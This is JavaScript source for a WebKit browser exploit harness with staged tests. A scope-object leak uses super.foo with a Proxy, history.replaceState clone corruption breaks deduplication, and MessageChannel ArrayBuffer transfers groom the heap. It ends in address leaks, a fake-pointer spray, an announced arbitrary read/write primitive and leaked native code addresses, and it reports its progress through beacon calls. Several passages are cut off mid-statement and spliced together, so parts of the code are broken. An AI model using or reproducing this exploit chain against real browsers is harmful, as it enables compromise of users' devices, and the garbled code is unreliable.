// The webkit.js exploit leaks a scope object via super.foo + Proxy
// ============================================================
function testScopeLeak(){
  log('=== SECTION A: Scope Object Leak ===','info');
  beacon('A-START');
  try{
    // Create a class that leaks its receiver through super.foo + Proxy
    function ScopeLeaker(){}
    ScopeLeaker.prototype={
      leak:function(){return this.__proto__.__proto__}
    };
    // Actually use the real technique from webkit.js
    var Leaker=(function(){
      var cls=function(){};
      cls.prototype={
        leak:function(){
          // We need class syntax for super - test if available
          return null;
        }
      };
      return cls;
    })();

    // Test with class syntax (ES6)
    var leaked=null;
    try{
      leaked=eval("(function(){\
        class L{\
          leak(){return super.foo}\
        }\
        L.prototype.__proto__=new Proxy({},{\
          get:function(t,p,r){return r}\
        });\
        var l=L.prototype.leak;\
        return (function(){return l()})();\
      })()");
    }catch(e){
      log('Class syntax eval: '+e.message,'err');
      beacon('A-CLASS-FAIL','err='+e.message.substring(0,80));
    }

    if(leaked!==undefined && leaked!==null){
      log('Scope object leaked: type='+typeof leaked,'ok');
      // Test if we can set properties on it
      try{
        leaked.testProp=42;
        var readable=leaked.testProp;
        log('  Property set/read: '+(readable===42?'OK':'FAIL val='+readable),'ok');
      }catch(e){
        log('  Property set failed: '+e.message,'warn');
      }
      // Test indexed properties
      try{
        for(var i=0;i<10;i++) leaked[i]=1.1*i;
        log('  Indexed props written: 0-9','ok');
      }catch(e){
        log('  Indexed props failed: '+e.message,'warn');
      }
      // Test defineProperty with getter
      try{
        var getterCalled=false;

          configurable:true

      }

    }else{
      log('Scope leak returned: '+String(leaked),'err');

        class L{leak(){return super.foo}}\
        L.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r}});\
        var l=L.prototype.leak;\
        return (function(){return l()})();\
      })()");

    }catch(e){
      log('BigInt in state FAILED: '+e.message,'err');
      beacon('C-BIGINT-FAIL',e.message.substring(0,60));
    }

    // Test deduplication: same object at two indices
    var shared={marker:0x51515151};
    var testArr=new Array(5);
    testArr[0]='filler';
    testArr[1]=shared;
    testArr[2]=shared; // Same reference
    testArr[3]='end';
    history.replaceState(testArr,'');
    var s4=history.state;
    if(s4){
      var dedup=(s4[1]===s4[2]);
      log('Deduplication test: clone[1]===clone[2] = '+dedup,'ok');
      log('  clone[1].marker='+hex32(s4[1]&&s4[1].marker||0),'info');
      log('  clone[2].marker='+hex32(s4[2]&&s4[2].marker||0),'info');
      beacon('C-DEDUP','same='+dedup);
    }

    // Test large array with -64000 at CONTROL_INDEX
    log('Building large array (0x10000 entries)...','info');
    var CONTROL=0xFFFF;
    var DUPLICATE=2;
    var ref={marker:0x51515151};

    // Build the filler graph (with BigInt)
    var fillerSize=0xFFFD;
    var filler=new Array(fillerSize);
    var pos=0;
    var huge=1n<<40n;
    filler[pos++]=huge; // 1 BigInt for modern WebKit path
    while(pos<fillerSize) filler[pos++]={};

    var outer=new Array(CONTROL+1);
    outer[0]=filler;
    outer[1]=ref;
    outer[2]=ref; // DUPLICATE_INDEX - same as [1]
    outer[CONTROL]=-64000; // The corruption trigger

    log('Storing via history.replaceState ('+outer.length+' entries)...','info');
    var storeStart=Date.now();
    history.replaceState(outer,'');
    var storeMs=Date.now()-storeStart;
    log('replaceState took '+storeMs+'ms','ok');
    beacon('C-STORE','ms='+storeMs+'|len='+outer.length);

    // Now read it back - this triggers deserialization and potentially corruption
    log('Reading history.state (triggers deserialization)...','info');
    var readStart=Date.now();
    var clone=history.state;
    var readMs=Date.now()-readStart;
    log('history.state read took '+readMs+'ms','ok');

    if(!clone){
      log('Clone is null!','err');
      beacon('C-CLONE-NULL');
      return;
    }

    log('Clone length: '+clone.length+' (expected '+(CONTROL+1)+')','info');
    beacon('C-CLONE','len='+clone.length+'|readMs='+readMs);

    // Check if deduplication held or was corrupted
    var c1=clone[1];
    var c2=clone[DUPLICATE];
    var same=(c1===c2);
    log('clone[1]===clone[2]: '+same,'info');

    if(same){
      log('Deduplication held - no corruption on this attempt','warn');
      beacon('C-NOCRASH','dedup=true');
    }else{
      log('DEDUPLICATION BROKEN! clone[1]!==clone[2]','hit');
      log('  clone[1] type: '+typeof c1,'info');
      log('  clone[2] type: '+typeof c2,'info');

      // Inspect clone[2] - if corruption worked, this might be a Uint8Array or strange object
      if(c2 instanceof Uint8Array){
        log('  clone[2] IS a Uint8Array! length='+c2.length,'hit');
        // Read its bytes
        var sample=[];
        for(var i=0;i<Math.min(48,c2.length);i++) sample.push(c2[i]);
        log('  First 48 bytes: '+sample.map(function(b){return hex32(b).slice(-2)}).join(' '),'hit');
        beacon('C-CORRUPTED','type=Uint8Array|len='+c2.length);
      }else if(c2 instanceof ArrayBuffer){
        log('  clone[2] IS an ArrayBuffer! size='+c2.byteLength,'hit');
        beacon('C-CORRUPTED','type=ArrayBuffer|size='+c2.byteLength);
      }else if(typeof c2==='object' && c2!==null){

        log('  clone[2] = '+String(c2),'info');
        beacon('C-DIFF','type='+typeof c2+'|val='+String(c2).substring(0,30));
      }
    }

    // Check if -64000 survived
    var controlVal=clone[CONTROL];
    log('clone[0xFFFF]: '+controlVal+' (type='+typeof controlVal+')','info');

    // Clean up
    history.replaceState(null,'');

  }catch(e){
    log('Section C error: '+e.message,'err');
    beacon('C-ERR',e.message.substring(0,100));
    try{history.replaceState(null,'');}catch(e2){}
  }
}

function testMessageChannelTransfer(){
  log('','');

  beacon('D-START');
  try{
    if(typeof MessageChannel!=='function'){
      log('MessageChannel not available','err');
      beacon('D-NOMC');
      return;
    }
    var ch=new MessageChannel();
    log('MessageChannel created','ok');

    // Test transfer (detach) of ArrayBuffers
    var ab1=new ArrayBuffer(0x10000);
    var view1=new Uint8Array(ab1);
    view1[0]=0x42;
    log('AB before transfer: byteLength='+ab1.byteLength+' view[0]='+view1[0],'ok');

    ch.port1.postMessage(0,[ab1]);
    log('After transfer: byteLength='+ab1.byteLength+' (expected 0 = detached)','ok');
    var detached=(ab1.byteLength===0);
    log('ArrayBuffer detached: '+detached,'ok');

    // Test multiple transfers (heap hole creation)
    var holes=[];
    var holeSizes=[0x80000, 0x80000, 0x70000, 0x81000, 0x81000];
    for(var i=0;i<holeSizes.length;i++){
      holes.push(new ArrayBuffer(holeSizes[i]));
    }
    log('Created '+holes.length+' hole buffers','ok');

    var ch2=new MessageChannel();
    ch2.port1.postMessage(0,holes);
    var allDetached=true;
    for(var i=0;i<holes.length;i++){
      if(holes[i].byteLength!==0) allDetached=false;
    }
    log('All holes detached: '+allDetached,'ok');
    beacon('D-RESULT','detach='+detached+'|holes='+allDetached);

    ch.port1.close();ch.port2.close();
    ch2.port1.close();ch2.port2.close();

  }catch(e){
    log('Section D error: '+e.message,'err');
    beacon('D-ERR',e.message.substring(0,80));
  }
}

  // Read pointer words
  var cWords=new Uint16Array(16);
  for(var i=0;i<16;i++) cWords[i]=capturedStr.charCodeAt(7+i);

  function ptrFromWords(ws,off){
    if(ws[off+3]!==0)return NaN;
    var lo=ws[off]+ws[off+1]*0x10000;
    return lo+ws[off+2]*0x100000000;
  }

  var hostAddr=ptrFromWords(cWords,0);
  var holderAddr=ptrFromWords(cWords,4);
  var hostAddr2=ptrFromWords(cWords,8);
  var holderAddr2=ptrFromWords(cWords,12);

  log('Leaked addresses:','info');
  log('  fakeHost[0]:  '+hex(hostAddr),'info');
  log('  targetHolder[0]: '+hex(holderAddr),'info');
  log('  fakeHost[1]:  '+hex(hostAddr2),'info');
  log('  targetHolder[1]: '+hex(holderAddr2),'info');

  var addrMatch=(hostAddr===hostAddr2 && holderAddr===holderAddr2);
  var addrValid=(!isNaN(hostAddr)&&!isNaN(holderAddr)&&plausibleCellV(hostAddr)&&plausibleCellV(holderAddr)&&hostAddr!==holderAddr);

  log('Addresses match: '+addrMatch+', valid: '+addrValid,'info');
  beacon('E-ADDRS','host='+hex(hostAddr)+'|holder='+hex(holderAddr)+'|match='+addrMatch+'|valid='+addrValid);

  if(!addrMatch||!addrValid){
    log('Address leak failed - addresses not consistent or not valid','err');
    beacon('E-ADDR-FAIL');
    history.replaceState(null,'');
    return;
  }

  log('ADDRESS LEAK SUCCEEDED!','ok');

  // Stage 3: Heap grooming + clone corruption
  var fakeAddr=hostAddr+0x10;
  log('Fake address: '+hex(fakeAddr),'info');

  if(!plausibleCellV(fakeAddr)){
    log('Fake address not plausible','err');
    beacon('E-FAKE-FAIL');
    history.replaceState(null,'');
    return;
  }

  log('Grooming heap...','info');
  var keepAlive=[];
  var keepIdx=0;

  var ch=new MessageChannel();
  ch.port1.close();
  ch.port2.close();

  // Fill heap
  for(var i=0;i<512;i++) keepAlive[keepIdx++]=new ArrayBuffer(0x10000);

  // Create and transfer large slab
  var slab=new ArrayBuffer(0x400000);
  ch.port1.postMessage(0,[slab]);
  slab=null;

  // Create hole buffers
  var bh1=new ArrayBuffer(0x81000);
  var bh2=new ArrayBuffer(0x81000);
  var sep=new ArrayBuffer(0x10000);
  var earlyH=new ArrayBuffer(0x70000);
  var guard=new ArrayBuffer(0x90000);
  var predecessor=new ArrayBuffer(0x80000);
  var finalH=new ArrayBuffer(0x80000);

  // Fill predecessor with fakeAddr pointer spray
  var predWords=new Uint32Array(predecessor);
  var fakeHi=Math.floor(fakeAddr/0x100000000);
  var fakeLo=fakeAddr-fakeHi*0x100000000;
  for(var i=0;i<predWords.length;i+=2){
    predWords[i]=fakeLo;
    predWords[i+1]=fakeHi;
  }
  log('Predecessor sprayed with fakeAddr','ok');

  keepAlive[keepIdx++]=sep;
  keepAlive[keepIdx++]=guard;
  keepAlive[keepIdx++]=predecessor;

  // Transfer holes
  ch.port1.postMessage(0,[bh1,bh2,earlyH,finalH]);
  log('Holes created via transfer','ok');

  // Stage 4: Read history.state - triggers corruption
  log('Reading history.state (corruption trigger)...','info');
  beacon('E-CLONE-START');

  var clone;
  try{
    clone=history.state;
  }catch(e){
    log('history.state threw: '+e.message,'err');
    beacon('E-CLONE-ERR',e.message.substring(0,60));
    return;
  }

  if(!clone){
    log('Clone is null','err');
    beacon('E-CLONE-NULL');
    return;
  }

  log('Clone length: '+clone.length+' (expected 327681)','info');

  if(clone.length!==0x50001){
    log('Unexpected clone length','warn');
    beacon('E-CLONE-BADLEN','len='+clone.length);
  }

  // Check corruption
  var c1=clone[1];
  var c2=clone[DUPLICATE_INDEX];
  var dedup=(c1===c2);

  if(dedup){
    log('Clone NOT corrupted (dedup held)','warn');
    beacon('E-NOCRASH','dedup=true');
    // Clean up and we'll retry
    clone=null;
    predWords.fill(0);
    history.replaceState(null,'');
    return;
  }

  log('CLONE CORRUPTED! clone[1]!==clone[2]','hit');
  beacon('E-CORRUPTED','type2='+typeof c2);

  // Inspect the corrupted view
  var candidate=c2;
  clone[DUPLICATE_INDEX]=undefined;
  clone=null;

  if(candidate instanceof Uint8Array){
    log('Corrupted slot IS Uint8Array! len='+candidate.length,'hit');

    // Read header
    readBytesInto(viewHeaderBuf,candidate,CELL_BYTES);

    // Inspect header
    var structId=uint32AtB(viewHeaderBuf,0);
    var butterPtr=low48AtB(viewHeaderBuf,0x08);
    var vectorPtr=low48AtB(viewHeaderBuf,0x10);
    var length=uint32AtB(viewHeaderBuf,0x18);

    log('View header:','info');
    log('  structureID: '+hex32(structId),'info');
    log('  butterfly:   '+hex(butterPtr),'info');
    log('  vector:      '+hex(vectorPtr),'info');
    log('  length:      '+length+' (expected '+MEMORY_WINDOW_SIZE+')','info');

    beacon('E-HEADER','sid='+hex32(structId)+'|vec='+hex(vectorPtr)+'|len='+length);

    // Validate
    var validStruct=(structId>=0x100 && structId<0x08000000);
    var validButterfly=plausibleAddr(butterPtr);
    var validVector=plausibleAddr(vectorPtr);
    var validLength=(length===MEMORY_WINDOW_SIZE);
    var validZero=allZeroB(viewHeaderBuf,0x20,0x28);

    log('Validation: struct='+validStruct+' butterfly='+validButterfly+' vector='+validVector+' length='+validLength+' zeroPad='+validZero,'info');

    if(validStruct && validVector && validLength){
      log('VALID VIEW HEADER!','hit');

      // Check if this is our view via canary
      var isOurs=isOurView(candidate,vectorPtr);
      log('Identity check (canary at vector+0x20): '+isOurs,'info');
      beacon('E-IDENTITY','ours='+isOurs+'|vec='+hex(vectorPtr));

      if(isOurs){
        log('','');
        log('*** FULL MEMORY WINDOW ESTABLISHED ***','hit');
        log('*** ARBITRARY READ/WRITE PRIMITIVE READY ***','hit');
        beacon('E-WIN','vec='+hex(vectorPtr)+'|host='+hex(hostAddr)+'|holder='+hex(holderAddr));

        // Now walk the chain: holder -> function -> executable -> nativeFunction
        log('Walking object chain...','info');

        // Read targetHolder
        redirectViewE(candidate,holderAddr);
        var holderBytes=new Uint8Array(0x40);
        readBytesInto(holderBytes,memView,0x40);
        var fnAddr=low48AtB(holderBytes,0x10);
        log('  targetHolder.function: '+hex(fnAddr),'info');

        if(plausibleCellV(fnAddr)){
          // Read function object
          redirectViewE(candidate,fnAddr);
          var fnBytes=new Uint8Array(0x20);
          readBytesInto(fnBytes,memView,0x20);
          var execAddr=low48AtB(fnBytes,0x18);
          log('  function.executable: '+hex(execAddr),'info');

          if(plausibleCellV(execAddr)){
            // Read executable
            redirectViewE(candidate,execAddr);
            var execBytes=new Uint8Array(0x38);
            readBytesInto(execBytes,memView,0x38);
            var nativeFn=low48AtB(execBytes,0x28);
            var nativeCtor=low48AtB(execBytes,0x30);
            log('  executable.nativeFunction:    '+hex(nativeFn),'info');
            log('  executable.nativeConstructor: '+hex(nativeCtor),'info');

            if(plausibleAddr(nativeFn)&&plausibleAddr(nativeCtor)){
              log('','');
              log('*** CODE ADDRESSES LEAKED ***','hit');
              log('*** WebKit base derivable from nativeConstructor ***','hit');
              beacon('E-CODE','nativeFn='+hex(nativeFn)+'|nativeCtor='+hex(nativeCtor));
            }
          }
        }

        // Restore view
        restoreViewE(candidate);
        liveCandidate=candidate;
      }
    }else{
      log('Invalid view header - corruption landed wrong','warn');
      beacon('E-BADHEADER');
    }
  }else{
    log('Corrupted slot is NOT Uint8Array: type='+typeof candidate,'warn');
    if(candidate&&typeof candidate==='object'){
      var k=Object.keys(candidate);
      log('  keys: '+k.slice(0,10).join(','),'info');
    }
    beacon('E-WRONGTYPE','type='+typeof candidate);
  }

  // Clean up
  predWords.fill(0);
  history.replaceState(null,'');
  log('Done','ok');
  beacon('E-DONE');
}
